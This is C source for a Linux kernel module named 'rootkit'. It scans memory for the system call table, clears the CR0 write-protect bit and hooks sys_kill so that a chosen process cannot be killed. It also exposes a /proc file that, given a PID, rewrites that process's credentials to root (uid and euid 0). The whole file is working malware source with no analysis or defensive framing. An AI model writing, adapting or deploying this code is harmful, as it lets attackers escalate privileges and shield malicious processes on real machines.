#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <linux/cred.h>



#define PROCFS_MAX_SIZE 1024
#define PROCFS_NAME "rootkit"

static char procfs_buffer[PROCFS_MAX_SIZE];
static unsigned long procfs_buffer_size = 0;

static struct proc_dir_entry *ProcFile;
unsigned long **sys_call_table;
unsigned long original_cr0;
long target_pid;

asmlinkage long (*original_sys_kill)(int pid, int sig);

asmlinkage long new_sys_kill(int pid, int sig) {
	if(pid == target_pid)
	{
		printk(KERN_INFO "KILL Stopped");
		return 0;

	}
	return original_sys_kill(pid, sig);
}
static unsigned long **aquire_sys_call_table(void) {
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;

	while (offset < ULLONG_MAX) {
		sct = (unsigned long **)offset;

		if (sct[__NR_close] == (unsigned long *) sys_close)
			return sct;

		offset += sizeof(void *);
	}

	return NULL;
}
void protect_pid(long pid){
	struct cred *target_cred = pid_task(find_get_pid(pid), PIDTYPE_PID)->cred;
	/* work around to change read only cred fields*/
	struct cred *newcred = (struct cred*) kmalloc(sizeof(struct cred), GFP_KERNEL);
	memcpy(newcred, target_cred, sizeof(struct cred));
	newcred->uid = 0;
	newcred->euid = 0;
	//newcred->suid = 0;
	//newcred->fsuid = 0;
	memcpy(target_cred, newcred, sizeof(struct cred)); //commit changes
}
int procfile_write(struct file *file, const char *buffer, unsigned long count, void *data){
	/* get buffer size */
	procfs_buffer_size = count;
	if(procfs_buffer_size > PROCFS_MAX_SIZE) procfs_buffer_size = PROCFS_MAX_SIZE;
	if(copy_from_user(procfs_buffer, buffer, procfs_buffer_size)) return -EFAULT;
	if(kstrtol(procfs_buffer, 10, &target_pid) != 0) return -EFAULT;
        protect_pid(target_pid);

	return procfs_buffer_size;
}

static int __init init_module(void){
    ProcFile = create_proc_entry(PROCFS_NAME, 0644, NULL);
	if (ProcFile == NULL)
	{
		remove_proc_entry(PROCFS_NAME, 0);
		printk(KERN_ALERT "Error: Could not initialize /proc/%s\n", PROCFS_NAME);
		return -ENOMEM;
	}
    //TODO: fixing permissions
	ProcFile->write_proc = procfile_write;
	ProcFile->mode = S_IFREG | S_IRUGO;
	ProcFile->uid = 0;
	ProcFile->gid = 0;
	ProcFile->size = 50;

	printk(KERN_INFO "/proc/%s created\n", PROCFS_NAME);

	if(!(sys_call_table = aquire_sys_call_table()))
		return -1;

	original_cr0 = read_cr0();

	write_cr0(original_cr0 & ~0x00010000);

	original_sys_kill = (void *)sys_call_table[__NR_kill];
	sys_call_table[__NR_kill] = (unsigned long *)new_sys_kill;

	write_cr0(original_cr0);
	printk(KERN_INFO "sys_call_table modified\n");

	return 0;
}

static void __exit cleanup_module(void){
	remove_proc_entry(PROCFS_NAME, 0);
	printk(KERN_INFO "/proc/%s removed\n", PROCFS_NAME);

	if(!sys_call_table)
	{
		return;
	}

	write_cr0(original_cr0 & ~0x00010000);
	sys_call_table[__NR_kill] = (unsigned long *) original_sys_kill;
	write_cr0(original_cr0);
    printk(KERN_INFO "sys_call_table restored\n");
}



MODULE_LICENSE("GPLv2");
module_init(init_module);
module_exit(cleanup_module);
